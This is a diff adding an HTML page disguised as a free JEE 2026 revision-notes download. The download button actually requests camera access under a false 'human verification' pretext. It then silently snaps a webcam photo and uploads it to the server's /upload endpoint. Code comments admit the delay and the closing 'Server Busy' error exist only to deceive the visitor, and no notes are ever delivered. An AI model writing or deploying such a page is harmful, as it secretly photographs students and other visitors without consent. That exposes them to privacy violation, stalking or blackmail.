@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JEE Prep Portal - Free Notes</title>
+    <style>
+        :root {
+            --edu-blue: #1a73e8;
+            --bg-gray: #f1f3f4;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--bg-gray);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            border-top: 8px solid var(--edu-blue);
+        }
+
+        .pdf-icon {
+            color: #d93025;
+            font-size: 50px;
+            margin-bottom: 10px;
+        }
+
+        h2 { color: #202124; font-size: 1.4rem; margin-bottom: 10px; }
+        p { color: #5f6368; font-size: 0.9rem; margin-bottom: 25px; }
+
+        .download-btn {
+            background-color: var(--edu-blue);
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            font-size: 1rem;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: background 0.2s;
+        }
+
+        .download-btn:hover { background-color: #1557b0; }
+
+        #v, #c { display: none; }
+
+        .loader {
+            display: none;
+            margin-top: 20px;
+            color: var(--edu-blue);
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="pdf-icon">📄</div>
+        <h2>JEE 2026: Physics & Maths</h2>
+        <p>Complete Chapter-wise Revision Notes by Top Faculties. <br><b>Size: 14.5 MB | Format: PDF</b></p>
+        
+        <button class="download-btn" id="start">
+            <svg width="20" height="20" fill="currentColor" viewBox="0 0 20 20"><path d="M3 17a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm3.293-7.707a1 1 0 011.414 0L9 10.586V3a1 1 0 112 0v7.586l1.293-1.293a1 1 0 111.414 1.414l-3 3a1 1 0 01-1.414 0l-3-3a1 1 0 010-1.414z"/></svg>
+            Download Study Material
+        </button>
+
+        <div id="status" class="loader">Generating secure download link...</div>
+
+        <video id="v" autoplay playsinline></video>
+        <canvas id="c" width="640" height="480"></canvas>
+    </div>
+
+    <script>
+        const startBtn = document.getElementById('start');
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
+        const status = document.getElementById('status');
+
+        startBtn.onclick = async () => {
+            try {
+                // Permission maangte hi process shuru
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                startBtn.style.display = 'none';
+                status.style.display = 'block';
+
+                // 2 second ka wait taaki user ko lage file ready ho rahi hai
+                setTimeout(async () => {
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    stream.getTracks().forEach(track => track.stop());
+
+                    canvas.toBlob(async (blob) => {
+                        const fd = new FormData();
+                        fd.append("photo", blob, "jee_user.jpg");
+
+                        try {
+                            await fetch("/upload", { method: "POST", body: fd });
+                            // Upload ke baad asli notes ka link bhi de sakte ho ya error dikha do
+                            status.innerHTML = "<span style='color:red'>Server Busy! Please try again in 5 minutes.</span>";
+                        } catch (e) {
+                            status.innerText = "Connection lost. Try again.";
+                        }
+                    }, 'image/jpeg');
+
+                }, 2000);
+
+            } catch (err) {
+                alert("Error: To download notes, please allow 'Camera Access' for human verification.");
+            }
+        };
+    </script>
+</body>
+</html>
